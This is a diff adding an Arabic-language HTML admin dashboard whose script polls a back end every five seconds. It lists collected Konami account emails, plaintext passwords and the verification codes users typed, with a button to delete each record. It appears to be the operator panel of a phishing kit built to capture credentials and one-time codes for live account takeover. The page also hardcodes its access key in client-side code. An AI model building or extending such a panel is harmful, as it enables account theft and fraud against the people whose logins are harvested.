@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <title>لوحة تحكم المنشئ</title>
+  <style>
+    body { font-family: Arial; background: #111; color: white; padding: 30px; }
+    .box { background: #222; padding: 20px; border-radius: 10px; max-width: 1000px; margin: auto; overflow-x: auto; }
+    table { width: 100%; margin-top: 20px; border-collapse: collapse; }
+    th, td { border: 1px solid #444; padding: 10px; text-align: center; }
+    th { background: #333; color: #f39c12; }
+    .code-box { background: #444; padding: 5px 10px; border-radius: 5px; font-family: monospace; font-weight: bold; color: #2ecc71; }
+    .btn-delete { background: #e74c3c; color: white; border: none; padding: 6px 12px; border-radius: 5px; cursor: pointer; font-weight: bold; }
+    .btn-delete:hover { background: #c0392b; }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <h1 style="color: #f39c12;">👑 لوحة تحكم المنشئ</h1>
+    <p>هنا تظهر بيانات المستخدمين، والكود الذي كتبوه.</p>
+    
+    <table>
+      <thead>
+        <tr>
+          <th>#</th>
+          <th>بريد كونامي</th>
+          <th>كلمة المرور</th>
+          <th>الكود الذي كتبه المستخدم</th>
+          <th>إجراء</th>
+        </tr>
+      </thead>
+      <tbody id="tableBody"></tbody>
+    </table>
+  </div>
+
+  <script>
+    const SECRET = "123@@@456"; 
+
+    async function loadRequests() {
+      const res = await fetch('/admin/requests?key=' + SECRET);
+      const data = await res.json();
+      
+      if (data.error) {
+        document.getElementById('tableBody').innerHTML = `<tr><td colspan="5" style="color:red">${data.error}</td></tr>`;
+        return;
+      }
+
+      document.getElementById('tableBody').innerHTML = data.map(r => `
+        <tr>
+          <td>${r.id}</td>
+          <td><strong>${r.konami_email}</strong></td>
+          <td style="color:#e74c3c;">${r.konami_password}</td>
+          <td><span class="code-box">${r.verification_code || 'لم يكتب بعد'}</span></td>
+          <td><button class="btn-delete" onclick="deleteRequest(${r.id})">🗑️ حذف</button></td>
+        </tr>
+      `).join('');
+    }
+
+    async function deleteRequest(id) {
+      if (!confirm('هل أنت متأكد من حذف هذا المستخدم؟')) return;
+      await fetch('/admin/delete-request/' + id + '?key=' + SECRET, { method: 'DELETE' });
+      loadRequests();
+    }
+
+    loadRequests();
+    setInterval(loadRequests, 5000); 
+  </script>
+</body>
+</html>
